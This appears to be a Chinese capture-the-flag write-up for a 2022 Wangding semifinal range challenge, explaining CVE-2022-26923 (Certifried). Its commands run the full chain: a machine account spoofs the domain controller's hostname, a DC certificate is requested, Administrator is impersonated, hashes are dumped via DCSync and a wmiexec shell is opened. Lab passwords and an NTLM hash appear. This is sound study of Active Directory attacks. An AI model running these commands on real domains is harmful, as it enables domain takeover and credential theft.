<!-- https://blog.csdn.net/longlangci/article/details/131686439 -->
网鼎 2022 半决赛靶场 flag04

- 更改 DNS Host Name。

```ps1
# 方法一, 如果用方法一后面的Test2都要改为Test1, 当前脚本使用的是方法二即 Test2用户
# 执行powershell将之前创建的机器账号Test1的DNS Host Name为域控的XR-DC01.xiaorang.lab并删除SPN。
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]'')
$searcher.filter = '(&(objectClass=computer)(sAMAccountName={0}$))' -f "Test1"
$obj = [ADSI]$searcher.FindAll().Path
$spn = @()
$obj.servicePrincipalName | % { $spn += $_ }
$dns = $obj.dNSHostName.ToString()
$spn | % { $obj.servicePrincipalName.Remove($_) }
$obj.dNSHostName = "xr-dc01.xiaorang.lab"
$obj.SetInfo()

# 方法二
# 通过certipy-ad创建一个机器账号Test2，并且设置DNS Host Name为域控的 XR-DC01.xiaorang.lab。
pip3 install certipy-ad
proxychains certipy account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user Test2 -pass Test1234 -dns 'XR-DC01.xiaorang.lab'
```

- 用该机器账户向 XR-CA 请求证书。

```sh
# 申请域控制器账户的证书, 由于 Test2 的 dNSHostName 属性值已被修改为 xr-dc01.xiaorang.lab，因此以该账户申请证书时，将为我们颁发域控制器的计算机账户的证书。
proxychains certipy req -u Test2\$@xiaorang.lab -p Test1234 -target 172.22.15.18 -ca "xiaorang-XR-CA-CA" -template Machine
proxychains certipy auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debug # 遇到 KDC_ERR_PADATA_TYPE_NOSUPP 错误，显示 KDC 不支持 PADATA 类型（预认证数据）, Kerberos 预身份验证失败。用方法二
```

```sh
# 方法二  KDC 不支持 PADATA 类型时
certipy cert -pfx xr-dc01.pfx > cert.pem

# 密码为Test1234
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# 在远程桌面机器上复制 PassTheCertificate 和  cert.pfx 后执行
PassTheCertificate.exe -CertPath .\cert.pfx -CertPassword Test1234 -MachineAccount Test3$ -MachinePassword Test1234 -Target "CN=XR-DC01,OU=Domain Controllers,DC=xiaorang,DC=lab"

# kali: 配置 hosts
sudo vi /etc/hosts
172.22.15.35 XR-0687.xiaorang.lab
172.22.15.13 XR-DC01.xiaorang.lab

proxychains impacket-getST xiaorang.lab/Test3\$:Test1234 -dc-ip 172.22.15.13 -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator

export KRB5CCNAME=Administrator.ccache
proxychains impacket-wmiexec -k XR-DC01.xiaorang.lab  -dc-ip 172.22.15.13 -no-pass
```

```sh
# 方法一 支持 PADATA 类型时
## 通过颁发的证书对KDC进行PKINIT Kerberos身份验证，并获取域控制器账户的TGT票据。
proxychains4 certipy auth -pfx xr-dc-01.pfx -username XR-DC01\$ -domain xiaorang.lab -dc-ip xr-dc01.xiaorang.lab

## 由于域控制器账户默认对域对象拥有DS-Replication-Get-Changes和DS-Replication-Get-Change-All扩展权限，因此可以通过DCSync转储所有域哈希。
export KRB5CCNAME=xr.dc01.ccache
proxychains4 python3 secretsdump.py -k xiaorang.lab/xr-dc01\$@xr-dc01.xiaorang.lab -no-pass -just-dc
proxychains4 impacket-wmiexec xiaorang.lab/Administrator@xr-dc01.xiaorang.lab -hashes :26b321bde63de24097cd6610547e858b
```

# 介绍 CVE-2022-26923

该漏洞是由于对用户属性的不正确获取,允许低权限用户在安装了 Active Directory 证书服务（AD CS）的域环境中将权限提升至域管理员。

- Certifried-Active Directory Elevation of Privilege
- 默认情况下，域用户账户可以注册 User 证书模板，计算机账户可以注册 Machine 证书模板。
  两个证书模板都允许执行客户端身份验证。
- 在申请计算机证书时，ADCS 将计算机对象的 dNSHostName 属性的值添加到证书的主题备用名称中。当我们使用证书进行身份验证时，KDC 会尝试将这个 dNSHostName 属性值从证书映射到目标账户。
- 因此，如果我们将某个可控计算机账户（PENTEST01 ＄）的 dNSHostName 值改为与域控制器的计算机账户相同的 dNSHostName 值，那么就意味着我们可以欺骗 AD CS，并最终申请到域控制器的 AD 证书。
